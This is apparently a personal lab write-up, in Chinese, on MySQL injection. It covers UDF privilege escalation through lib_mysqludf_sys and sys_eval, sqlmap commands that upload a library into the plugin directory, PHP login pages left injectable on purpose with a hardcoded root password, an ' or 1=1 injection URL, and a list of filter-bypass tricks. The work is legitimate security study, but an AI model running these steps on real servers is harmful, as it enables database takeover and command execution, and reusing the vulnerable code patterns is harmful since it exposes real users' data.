# mysql注入测试



---
## 一、基础注入环境 ##

###1.udf提权环境：###

    安装mysql：
    sudo apt-get install mysql-server
    sudo apt-get isntall mysql-client
    sudo apt-get install libmysqlclient-dev \\安装开发包
    安装apache：
    sudo apt-get install apache2
    安装php：
    sudo apt-get install php5

###2.绕过测试时使用wamp server即可。###

 
----------


## 二、UDF提权 ##

测试版本：Ubuntu14.04  mysql 5.5
----------


### 1.什么是UDF提权 ###
    

udf是MySQL的一个共享库，通过udf创建能够执行系统命令的函数sys_exec、sys_eval，使得入侵者能够获得一般情况下无法获得的shell执行权限。

### 2.提权条件###
获得具有一定权限的mysql账号密码，一般为root账户。

###3.提权过程 ###

 1. 得到插件库路径 
 2. 找对应操作系统的udf库文件：lib_mysqludf_sys.so（windows是对应的dll文件）
 3. 利用udf库文件加载函数并执行命令

具体步骤如下：
***1.找到MySQL插件目录:***

    mysql> show variables like "%plugin%";
    +---------------+------------------------+
    | Variable_name | Value                  |
    +---------------+------------------------+
    | plugin_dir    | /usr/lib/mysql/plugin/ |
    +---------------+------------------------+
    1 row in set (0.00 sec)

/usr/lib/mysql/plugin/即为插件目录。mysql5.1以后必须将lib_mysqldf_sys.so放入插件目录下才能创建函数。

***2.查看操作系统的版本，并下载相应版本的udf文件：***


    mysql> system uname -a
    Linux fuyao 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

> 可以看到mysql 中使用system即可执行系统命令。所以mysql用户的权限过大的话，甚至chmod命令都可以执行，风险也就非常大。




可以看出操作系统为linux64位的，然后下载相应版本的udf文件。([https://github.com/mysqludf/lib_mysqludf_sys#readme][1])


**直接从网上下载的.so文件可能会不生效，mysql会报错，所以建议在自己的linux64位虚拟机里对文件的源码（.c）文件进行编译。编译命令为：
`gcc -DMYSQL_DYNAMIC_PLUGIN -fPIC -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so`
，使用生成的.so 文件进行操作。具体原因的话我猜测其他版本的系统编译出来的文件不具有普遍适用性。**接下来把.so文件导入到mysql插件目录就可以了。
  
  

> 这里就要说一下神器sqlmap了，执行sql语句和文件上传的功能都可以用sqlmap实现 ：
>   
> 
> python sqlmap.py -u 'http://xxxx' --sql-shell   show variables like
> "%plugin%";       \\\执行sql语句     
python sqlmap.py -u 'http://xxxx'
> --file-write=/lib_mysqludf_sys.so    --file-dest=/usr/lib/mysql/plugin/\\\上传文件

  ***3. 利用udf库文件加载函数并执行命令***
 

    CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';\\创建函数

![此处输入图片的描述][2]

    

    


## 三、基础防护绕过 ##
1.login.html
用来显示登录页面，用户输入序号和学号后，进入checkuser.php来核对输入是否正确。

    <html>
    <head>
    <title>登录</title>
    <meta http-equiv="content-type" content="text/html;charset=utf-8">
    </head>
    <body>
    <form method=post action=checkuser.php>
    序号：<input type=text name=id  ><br>
    学号：<input type=password name=number > <br>
    <input type=submit name=btn value=登录>
    </form>
    </body>
    </html>
    
![此处输入图片的描述][3]
2.checkuser.php
用来检验用户输入的序号和学号是否正确，若不正确则显示输入错误，可重新输入，若输入正确即可成功登录至a.php页面。可注入。

        <?php
        header("Content-type: text/html;charset=utf-8");
        error_reporting(E_ALL || ~E_NOTICE);
        $link=mysql_connect("localhost","root","as971226") or die("link fail");
    mysql_query("set names 'utf8'");//读库
    mysql_select_db("fuyao",$link)or die("select_db fail");
        $id=$_POST["id"]; 
        $number=$_POST["number"];
        $str="select count(*) from test1 where id='$id' and number='$number';";
    echo $str;
        $query=mysql_query($str,$link) or die("无法执行sql语句");
    list($mycount)=mysql_fetch_row($query);
    if($mycount==0)
        {
    	echo "序号或学号错误！！！！！！";
    	echo "$name---$number";
    	include"login.html";
    	exit;
        }
        else
    	header("location:http://localhost/a.php?id=$id&number=$number");
        ?>
![此处输入图片的描述][4]
3.a.php
此页面用于显示用户信息，可注入。

        <?php
        header("Content-type: text/html;charset=utf-8");
        error_reporting(E_ALL || ~E_NOTICE);
        $id = $_GET['id'];
        $number=$_GET['number'];
        echo "执行的sql语句为：" ;
        echo "select * from test1 where id='" . $id . "'and number='".$number."';"."<br/>";
        echo "<hr>";
        $mysqli = new mysqli('127.0.0.1','root','as971226','fuyao'); 
    if(mysqli_connect_errno())
    {
        printf("连接失败:%s<br>",mysqli_connect_error());
        exit();
    }
    $result = $mysqli->query("select * from test1 where id='$id' and number='$number';");
    while(list($id,$college,$number,$name,$str1,$str2)=$result->fetch_row())
        {
            echo "用户ID：" . $id . "<br/>";
        echo "用户密码：" . $number . "<br/>";
        }
        $result->close();
    $mysqli->close();
    
        ?>
![tu3][5]

### 1.过滤单引号 ###
在a.php中增加如下代码：

    $id=str_replace("'",'',$id);
    $number=str_replace("'",'',$number);
查询语句为：

    select * from test1 where id='$id' and number='$number';
所以基本无法绕过。
###  2.过滤空格  ###
过滤之前访问此url：`http://localhost/a.php?id=3&number=1' or 1=1;%23`
即可完成注入。
![此处输入图片的描述][6]


现在在a.php中加入如下代码，过滤空格：

    $id=str_replace(" ",'',$id);
    $number=str_replace(" ",'',$number);
再次访问原来的url发现注入失败。
![此处输入图片的描述][7]


> 绕过方法：

***1.括号绕过***
![此处输入图片的描述][8]


***2.注释符绕过***
![此处输入图片的描述][9]


***3.换行符、TAB(%0A、%09)绕过***
![此处输入图片的描述][10]


### 3、过滤关键词 ###
***1.大小写绕过***

![此处输入图片的描述][11]


***2.用||和&&代替 or和and***

![此处输入图片的描述][12]


***3.多重嵌套绕过***

![此处输入图片的描述][13]


  [1]: https://github.com/mysqludf/lib_mysqludf_sys#readme
  [2]: http://www.xfcxc.top/Adgainai4/012.png
  [3]: http://www.xfcxc.top/Adgainai4/001.png
  [4]: http://www.xfcxc.top/Adgainai4/002.png
  [5]: http://www.xfcxc.top/Adgainai4/003.png
  [6]: http://www.xfcxc.top/Adgainai4/004.png
  [7]: http://www.xfcxc.top/Adgainai4/005.png
  [8]: http://www.xfcxc.top/Adgainai4/006.png
  [9]: http://www.xfcxc.top/Adgainai4/007.png
  [10]: http://www.xfcxc.top/Adgainai4/008.png
  [11]: http://www.xfcxc.top/Adgainai4/009.png
  [12]: http://www.xfcxc.top/Adgainai4/010.png
  [13]: http://www.xfcxc.top/Adgainai4/011.png